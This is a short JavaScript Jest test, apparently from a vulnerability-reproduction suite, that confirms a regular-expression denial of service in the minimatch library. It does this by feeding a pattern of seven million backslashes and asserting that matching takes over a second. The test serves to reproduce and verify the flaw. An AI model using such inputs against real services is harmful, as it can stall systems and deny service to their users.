test("ReDos in minimatch", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const minimatch = require("minimatch");
  let attack_str = "[!" + genstr(7000000, "\\") + "A";
  let t = measureTime(function () {
    minimatch("foo", attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
